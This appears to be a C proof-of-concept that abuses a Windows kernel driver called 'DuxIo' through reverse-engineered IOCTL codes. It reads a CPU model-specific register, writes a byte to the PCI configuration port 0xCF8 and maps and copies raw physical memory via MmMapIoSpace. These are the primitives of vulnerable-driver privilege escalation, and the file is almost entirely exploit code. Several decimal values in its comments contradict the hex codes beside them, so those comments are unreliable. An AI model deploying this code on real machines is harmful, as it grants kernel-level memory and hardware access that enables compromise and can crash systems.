#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

// DuxIo Control Codes extracted from the dispatch switch cases
#define IOCTL_PORT_IN_BYTE       0x80102078 // -2146426776
#define IOCTL_PORT_IN_WORD       0x8010207C // -2146426772
#define IOCTL_PORT_IN_DWORD      0x80102080 // -2146426800 / related
#define IOCTL_PORT_OUT_BYTE      0x801020C0 // -2146426656
#define IOCTL_PORT_OUT_WORD      0x801020C4 // -2146426652
#define IOCTL_PORT_OUT_DWORD     0x801020C8 // -2146426648
#define IOCTL_MSR_READ           0x80102158 // sub_14000172C
#define IOCTL_MSR_WRITE          0x8010215C // sub_1400017A0
#define IOCTL_PHYSICAL_COPY      0x80102098 // sub_140001BD8 (MmMapIoSpace)

// Helper function to execute a generic DeviceIoControl request
BOOL SendDuxIoCommand(HANDLE hDevice, DWORD ioctlCode, LPVOID inBuf, DWORD inSize, LPVOID outBuf, DWORD outSize) {
    DWORD bytesReturned = 0;
    BOOL success = DeviceIoControl(
        hDevice,
        ioctlCode,
        inBuf,
        inSize,
        outBuf,
        outSize,
        &bytesReturned,
        NULL
    );
    return success;
}

int main() {
    HANDLE hDevice = CreateFileA(
        "\\\\.\\DuxIo",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open DuxIo handle: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Successfully opened handle to \\\\.\\DuxIo\n");

    // ==========================================
    // CASE 1: Read/Write CPU Model Specific Registers (MSR)
    // ==========================================
    {
        struct {
            DWORD MsrIndex;
            DWORD Padding;
            ULONGLONG MsrValue;
        } msrPayload = { 0 };

        msrPayload.MsrIndex = 0xC0000080; // Example: IA32_EFER MSR

        // Read MSR
        if (SendDuxIoCommand(hDevice, IOCTL_MSR_READ, &msrPayload, sizeof(msrPayload), &msrPayload, sizeof(msrPayload))) {
            printf("[+] MSR Read Success! Value: 0x%016llX\n", msrPayload.MsrValue);
        }
    }

    // ==========================================
    // CASE 2: Direct Hardware Port I/O (IN/OUT)
    // ==========================================
    {
        // Example structure for port out: [Port ID (4 bytes)] [Value to write (1-4 bytes)]
        struct {
            DWORD PortNumber;
            BYTE ValueToWrite;
        } portPayload = { 0 };

        portPayload.PortNumber = 0xCF8;
        portPayload.ValueToWrite = 0x42;

        if (SendDuxIoCommand(hDevice, IOCTL_PORT_OUT_BYTE, &portPayload, sizeof(portPayload), NULL, 0)) {
            printf("[+] Port Out Byte executed successfully.\n");
        }
    }

    // ==========================================
    // CASE 3: Physical Memory Mapping & Copy (MmMapIoSpace)
    // ==========================================
    {
        // Structure mapped inside sub_140001BD8:
        // [Physical Address (8 bytes)] [Size to copy (4-8 bytes)] [Output/Input Buffer pointer]
        struct {
            ULONGLONG PhysicalAddress;
            ULONGLONG Size;
            ULONGLONG UserBufferPtr;
        } physPayload = { 0 };

        unsigned char readBuffer[256] = { 0 };

        physPayload.PhysicalAddress = 0x1000; // Target physical address
        physPayload.Size = sizeof(readBuffer);
        physPayload.UserBufferPtr = (ULONGLONG)readBuffer;

        if (SendDuxIoCommand(hDevice, IOCTL_PHYSICAL_COPY, &physPayload, sizeof(physPayload), readBuffer, sizeof(readBuffer))) {
            printf("[+] Physical Memory Mapped & Copied successfully! First byte: 0x%02X\n", readBuffer[0]);
        } else {
            printf("[-] Physical memory operation failed: %d\n", GetLastError());
        }
    }

    CloseHandle(hDevice);
    return 0;
}